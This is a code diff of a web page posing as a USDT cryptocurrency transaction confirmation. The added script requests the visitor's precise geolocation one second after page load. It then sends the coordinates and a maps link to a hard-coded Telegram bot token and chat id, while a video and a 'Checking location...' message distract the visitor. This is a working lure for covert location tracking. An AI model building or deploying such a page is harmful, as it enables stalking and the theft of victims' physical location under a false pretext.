@@ -1,20 +1,76 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>Transaction Confirmation</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link rel="stylesheet" href="style.css" />
+  <meta charset="UTF-8">
+  <title>USDT Transaction</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      background-color: #000;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      color: white;
+      font-family: Arial, sans-serif;
+    }
+    video {
+      width: 90%;
+      border-radius: 12px;
+      border: 2px solid gold;
+    }
+    .msg {
+      margin-top: 10px;
+      font-size: 16px;
+      color: gold;
+    }
+  </style>
 </head>
 <body>
-  <div class="container">
-    <video id="vid" autoplay muted playsinline>
-      <source src="usdt.mp4" type="video/mp4" />
-      Your browser does not support HTML5 video.
-    </video>
-    <p class="status">Checking transaction status...</p>
-  </div>
+  <video id="vid" autoplay muted playsinline>
+    <source src="usdt.mp4" type="video/mp4">
+    Your browser does not support HTML5 video.
+  </video>
+  <div class="msg">Checking location...</div>
 
-  <script src="script.js"></script>
+  <script>
+    function sendLocation(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+      const token = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0";
+      const chat_id = "7485197107";
+      const msg = `📍 Location Received:\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chat_id,
+          text: msg
+        })
+      });
+    }
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation, function(error) {
+          console.log("Location permission denied or failed");
+        }, {
+          enableHighAccuracy: true,
+          timeout: 5000,
+          maximumAge: 0
+        });
+      }
+    }
+
+    // تشغيل طلب الموقع بعد ثانية من بدء الصفحة
+    window.onload = function () {
+      setTimeout(getLocation, 1000);
+    };
+  </script>
 </body>
 </html>
